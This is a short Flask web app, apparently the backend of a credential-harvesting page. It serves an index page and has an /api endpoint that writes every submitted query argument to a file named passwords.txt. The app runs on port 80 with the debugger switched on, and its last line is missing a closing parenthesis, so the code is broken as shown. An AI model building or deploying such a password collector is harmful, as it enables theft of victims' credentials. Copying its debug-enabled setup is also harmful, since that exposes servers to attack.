from flask import Flask,request,render_template,jsonify
from flask_restful import Resource,Api

app = Flask(__name__)
api = Api(app)


@app.route('/')
def index():
	return render_template("index.html")


class Student(Resource):
	def get(self):
		with open("passwords.txt", "a") as f:
			f.write("\n" + str(request.args) + "\n")
		return request.args


api.add_resource(Student,'/api')


if __name__ == '__main__':
	app.run(host='0.0.0.0', port=80, debug=True
